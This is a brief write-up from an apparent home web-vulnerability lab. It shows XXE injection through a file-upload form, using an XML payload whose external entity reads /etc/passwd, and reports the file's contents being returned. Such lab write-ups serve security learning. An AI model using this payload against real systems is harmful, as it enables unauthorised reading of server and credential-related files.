# XXE - External Entities Injection

- We have got a file upload feature.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/9981feb5-f4be-4001-9aaa-7934811898a9)

- make a file with a username and password in the form of an XML file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <user>testuser</user>
    <password>testpass</password>
</creds>
```
- while uploading the file we got the username and password.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d6e4a841-c958-4438-a800-c2734a84807b)

- Now, we will parse an XML file which will return us the passwd file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```
- On uploading the file we got data of the passwd file back.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/85bde9bf-fa9a-4da0-a93e-bd0f6c9018ea)

- To view it more neatly, we will switch to the view source by using ctrl+U.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/2f532ae5-d302-460f-94e9-05172b6d24e9)
